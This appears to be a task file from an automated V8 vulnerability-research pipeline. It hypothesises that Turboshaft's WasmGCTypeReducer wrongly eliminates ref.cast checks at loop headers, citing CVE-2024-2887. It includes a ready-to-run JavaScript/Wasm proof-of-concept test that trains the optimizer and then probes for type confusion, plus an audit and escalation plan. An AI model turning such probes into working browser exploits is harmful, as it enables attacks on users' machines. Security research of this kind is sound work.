# Genome 056 — loop-header-type-narrowing

## Hypothesis
W7: Wasm GC loop bodies can narrow types via ref.cast, ref.test, br_on_cast. The Turboshaft compiler's type inference at loop headers creates phi nodes with merged types. If a loop body casts a value to a more specific type and uses it, the compiler may:

1. **Widen the loop header phi** to accept both the narrowed and un-narrowed type, then
2. **Trust the narrowed type** after the cast within the loop body

If the loop header phi's type is computed too narrowly (e.g., using only the first iteration's input), a later iteration with a different input type could bypass the cast. Conversely, if the compiler proves the cast always succeeds (via type knowledge from the phi), it may eliminate the cast entirely — then a different input type on a later iteration would cause a type confusion.

**Specific target:** `WasmGCTypeReducer` in Turboshaft. It performs type-based optimizations like eliminating redundant casts and branches. If it uses loop header phi types that are too narrow, it could eliminate casts that are actually needed.

Multi-factor: [loop header phi type merge] × [WasmGCTypeReducer cast elimination] × [varying input types across iterations] = type confusion.

## DNA

### Source Files to Audit
- `src/compiler/turboshaft/wasm-gc-type-reducer.h` — type-based cast/branch elimination
- `src/compiler/turboshaft/loop-unrolling-reducer.h` — loop unrolling may duplicate casts
- `src/compiler/turboshaft/wasm-lowering-reducer.h` — Wasm-specific lowering
- `src/compiler/turboshaft/type-inference-reducer.h` — general type inference
- `src/wasm/wasm-subtyping.h` — subtype relationships

### Key Mechanism
```
Loop header:
  phi: T = merge(input_type, back_edge_type)

Loop body:
  cast: ref.cast<SubT>(phi) → if TypeReducer knows phi: SubT, eliminates cast
  use: struct.get on cast result (trusts SubT layout)

Back edge:
  Different value flows back → phi type should be SuperT, not SubT
  But if TypeReducer already eliminated the cast...
```

### Related CVE
CVE-2024-2887: Type check elimination from wrong inference in WasmGCOptimize. The optimizer incorrectly proved a cast always succeeds and eliminated it, allowing type confusion between struct types with different field layouts.

## Ready-to-Run Test

```javascript
// Flags: --allow-natives-syntax --experimental-wasm-gc --turboshaft-wasm
load('/Users/t/v8/test/mjsunit/wasm/wasm-module-builder.js');

let b = new WasmModuleBuilder();

// Two struct types with different field layouts
let structA = b.addStruct([makeField(kWasmI32, true), makeField(kWasmI64, true)]);
let structB = b.addStruct([makeField(kWasmF64, true), makeField(kWasmI32, true)]);
// Common supertype
let structBase = b.addStruct([]);  // empty base

// Make A and B subtypes of Base
// Actually, in Wasm GC, struct subtyping requires matching field prefixes
// Let's use a different approach: anyref as the common supertype

let kAnyRef = kWasmAnyRef;

// Function that takes anyref, casts in a loop
b.addFunction('loop_cast', makeSig([kAnyRef, kWasmI32], [kWasmI32]))
  .addLocals(kWasmI32, 1)  // local 2: accumulator
  .addBody([
    // Loop: cast input to structA, read field 0
    kExprLoop, kWasmVoid,
      // ref.cast to structA
      kExprLocalGet, 0,
      kGCPrefix, kExprRefCast, structA,
      // struct.get field 0 (i32)
      kGCPrefix, kExprStructGet, structA, 0,
      // Add to accumulator
      kExprLocalGet, 2,
      kExprI32Add,
      kExprLocalSet, 2,
      // Decrement counter
      kExprLocalGet, 1,
      kExprI32Const, 1,
      kExprI32Sub,
      kExprLocalTee, 1,
      // Branch if counter > 0
      kExprI32Const, 0,
      kExprI32GtS,
      kExprBrIf, 0,
    kExprEnd,
    kExprLocalGet, 2,
  ]).exportFunc();

// Create struct instances
b.addFunction('make_a', makeSig([kWasmI32], [wasmRefType(structA)]))
  .addBody([
    kExprLocalGet, 0,
    kExprI64Const, 0,
    kGCPrefix, kExprStructNew, structA
  ]).exportFunc();

b.addFunction('make_b', makeSig([], [wasmRefType(structB)]))
  .addBody([
    ...wasmF64Const(3.14),
    kExprI32Const, 99,
    kGCPrefix, kExprStructNew, structB
  ]).exportFunc();

let inst = b.instantiate();

// Phase 1: Tier up with only structA inputs (train the optimizer)
let a = inst.exports.make_a(42);
for (let i = 0; i < 20000; i++) {
  inst.exports.loop_cast(a, 1);
}
print('Phase 1: Tiered up with structA, result=' + inst.exports.loop_cast(a, 5));

// Phase 2: Pass structB — should throw, but if cast was eliminated...
try {
  let bObj = inst.exports.make_b();
  let result = inst.exports.loop_cast(bObj, 1);
  print('Phase 2: *** TYPE CONFUSION *** result=' + result + ' (should have thrown!)');
} catch(e) {
  print('Phase 2: Correctly threw: ' + e.message);
}

// Phase 3: More complex — loop with alternating types
b = new WasmModuleBuilder();
let sA = b.addStruct([makeField(kWasmI32, true)]);
let sB = b.addStruct([makeField(kWasmF64, true)]);

b.addFunction('alt_loop', makeSig([kAnyRef, kAnyRef, kWasmI32], [kWasmI32]))
  .addLocals(kWasmI32, 1)
  .addBody([
    kExprLoop, kWasmVoid,
      // On even iterations, cast to sA; on odd, cast to sB
      // But the optimizer might merge types at the loop header
      kExprLocalGet, 2,
      kExprI32Const, 1,
      kExprI32And,
      kExprIf, kWasmI32,
        kExprLocalGet, 0,
        kGCPrefix, kExprRefCast, sA,
        kGCPrefix, kExprStructGet, sA, 0,
      kExprElse,
        kExprLocalGet, 1,
        kGCPrefix, kExprRefCast, sB,
        kGCPrefix, kExprStructGetS, sB, 0,
        kExprI32TruncSatF64S,
      kExprEnd,
      kExprLocalGet, 3,
      kExprI32Add,
      kExprLocalSet, 3,
      kExprLocalGet, 2,
      kExprI32Const, 1,
      kExprI32Sub,
      kExprLocalTee, 2,
      kExprI32Const, 0,
      kExprI32GtS,
      kExprBrIf, 0,
    kExprEnd,
    kExprLocalGet, 3,
  ]).exportFunc();

b.addFunction('mk_a', makeSig([kWasmI32], [wasmRefType(sA)]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, sA]).exportFunc();
b.addFunction('mk_b', makeSig([], [wasmRefType(sB)]))
  .addBody([...wasmF64Const(1.5), kGCPrefix, kExprStructNew, sB]).exportFunc();

let inst2 = b.instantiate();
let aObj = inst2.exports.mk_a(7);
let bObj2 = inst2.exports.mk_b();

for (let i = 0; i < 20000; i++) {
  inst2.exports.alt_loop(aObj, bObj2, 10);
}
print('Phase 3: alt_loop result=' + inst2.exports.alt_loop(aObj, bObj2, 10));

// Phase 4: Now swap the objects — should still work correctly
try {
  let result = inst2.exports.alt_loop(bObj2, aObj, 10);
  print('Phase 4: Swapped args result=' + result);
} catch(e) {
  print('Phase 4: Threw (may be type confusion detection): ' + e.message);
}
```

## Evolution Plan
- v1: Run the test. Check for type confusion (wrong value returned instead of throwing).
- v2: If clean, audit WasmGCTypeReducer for how it handles loop header phi types. Look for `TypeCheckAlwaysSucceeds` or `RefCast` elimination logic.
- v3: Try br_on_cast with loop-dependent type narrowing.

## Task
Run the test. Save to `/tmp/loop_type_narrowing.js` and execute. If Phase 2 prints "TYPE CONFUSION" instead of throwing, we have a bug. Also audit `src/compiler/turboshaft/wasm-gc-type-reducer.h` for cast elimination logic near loops.

Post with tags `loop-header,type-narrowing,cast-elimination,turboshaft,W7`.
